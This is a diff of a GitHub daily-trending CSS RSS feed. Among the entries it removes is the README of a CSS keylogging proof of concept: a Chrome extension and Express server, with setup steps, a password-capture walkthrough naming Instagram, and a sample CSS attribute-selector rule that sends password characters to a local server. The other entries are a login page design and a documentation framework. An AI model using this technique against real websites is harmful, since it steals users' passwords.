@@ -1,21 +1,21 @@
 <?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
   <title>GitHub CSS Daily Trending</title>
   <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
-  <updated>2022-11-15T01:31:42Z</updated>
+  <updated>2022-11-16T01:32:25Z</updated>
   <subtitle>Daily Trending of CSS in GitHub</subtitle>
   <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
   <entry>
-    <title>rayashi/simple-login</title>
-    <updated>2022-11-15T01:31:42Z</updated>
-    <id>tag:github.com,2022-11-15:/rayashi/simple-login</id>
-    <link href="https://github.com/rayashi/simple-login" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;Simple tela de login&lt;/p&gt;&lt;hr&gt;</summary>
+    <title>codeminton/purple-login-page</title>
+    <updated>2022-11-16T01:32:25Z</updated>
+    <id>tag:github.com,2022-11-16:/codeminton/purple-login-page</id>
+    <link href="https://github.com/codeminton/purple-login-page" rel="alternate"></link>
+    <summary type="html">&lt;p&gt;YouTube Video&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Login Page Design (HTML &amp;amp; CSS)&lt;/h1&gt; &#xA;&lt;h6&gt;This login form is a mobile-friendly login form. You can even create a registration form and password reset form using this form. This form design will add elegance to your website :)&lt;/h6&gt; &#xA;&lt;p&gt;Preview image&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://gcdnb.pbrd.co/images/Jg8KnAx0IMif.png?o=1&#34; alt=&#34;Login Page Design (HTML &amp;amp; CSS)&#34; title=&#34;Login Page Design (HTML &amp;amp; CSS)&#34;&gt;&lt;/p&gt;</summary>
   </entry>
   <entry>
-    <title>maxchehab/CSS-Keylogging</title>
-    <updated>2022-11-15T01:31:42Z</updated>
-    <id>tag:github.com,2022-11-15:/maxchehab/CSS-Keylogging</id>
-    <link href="https://github.com/maxchehab/CSS-Keylogging" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;Chrome extension and Express server that exploits keylogging abilities of CSS.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CSS Keylogger&lt;/h1&gt; &#xA;&lt;p&gt;Chrome extension and Express server that exploits keylogging abilities of CSS.&lt;/p&gt; &#xA;&lt;h2&gt;To use&lt;/h2&gt; &#xA;&lt;h3&gt;Setup Chrome extension&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Download repository &lt;code&gt;git clone https://github.com/maxchehab/CSS-Keylogging&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Visit &lt;code&gt;chrome://extensions&lt;/code&gt; in your browser (or open up the Chrome menu by clicking the icon to the far right of the Omnibox: The menu&#39;s icon is three horizontal bars. and select Extensions under the More Tools menu to get to the same place).&lt;/li&gt; &#xA; &lt;li&gt;Ensure that the Developer mode checkbox in the top right-hand corner is checked.&lt;/li&gt; &#xA; &lt;li&gt;Click &lt;code&gt;Load unpacked extension…&lt;/code&gt; to pop up a file-selection dialog.&lt;/li&gt; &#xA; &lt;li&gt;Select the &lt;code&gt;css-keylogger-extension&lt;/code&gt; in the directory which you downloaded this repository.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Setup Express server&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;code&gt;yarn&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;yarn start&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Haxking l33t passw0rds&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Open a website that uses a controlled component framework such as React. &lt;a href=&#34;https://www.instagram.com/&#34;&gt;https://instagram.com&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Press the extension &lt;code&gt;C&lt;/code&gt; on the top right of any webpage.&lt;/li&gt; &#xA; &lt;li&gt;Type your password.&lt;/li&gt; &#xA; &lt;li&gt;Your password should be captured by the express server.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;How it works&lt;/h2&gt; &#xA;&lt;p&gt;This attack is really simple. Utilizing CSS attribute selectors, one can request resources from an external server under the premise of loading a &lt;code&gt;background-image&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For example, the following css will select all input&#39;s with a &lt;code&gt;type&lt;/code&gt; that equals &lt;code&gt;password&lt;/code&gt; and a &lt;code&gt;value&lt;/code&gt; that ends with &lt;code&gt;a&lt;/code&gt;. It will then try to load an image from &lt;code&gt;http://localhost:3000/a&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;input[type=&#34;password&#34;][value$=&#34;a&#34;] {&#xA;  background-image: url(&#34;http://localhost:3000/a&#34;);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a simple &lt;a href=&#34;https://github.com/maxchehab/CSS-Keylogging/raw/master/build.go&#34;&gt;script&lt;/a&gt; one can create a &lt;a href=&#34;https://github.com/maxchehab/CSS-Keylogging/raw/master/css-keylogger-extension/keylogger.css&#34;&gt;css file&lt;/a&gt; that will send a custom request for every ASCII character.&lt;/p&gt;</summary>
+    <title>evildmp/diataxis-documentation-framework</title>
+    <updated>2022-11-16T01:32:25Z</updated>
+    <id>tag:github.com,2022-11-16:/evildmp/diataxis-documentation-framework</id>
+    <link href="https://github.com/evildmp/diataxis-documentation-framework" rel="alternate"></link>
+    <summary type="html">&lt;p&gt;&#34;The Grand Unified Theory of Documentation&#34; (David Laing) - a popular and transformative documentation authoring framework&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;The documentation system&lt;/h1&gt; &#xA;&lt;p&gt;A comprehensive and practical system that can help maintainers of product documentation.&lt;/p&gt; &#xA;&lt;p&gt;Published at &lt;a href=&#34;https://diataxis.fr&#34;&gt;https://diataxis.fr&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Author: Daniele Procida&lt;/p&gt; &#xA;&lt;p&gt;License: &lt;code&gt;CC-BY-SA 4.0 &amp;lt;https://creativecommons.org/licenses/by-sa/4.0/&amp;gt;&lt;/code&gt;_&lt;/p&gt;</summary>
   </entry>
 </feed>
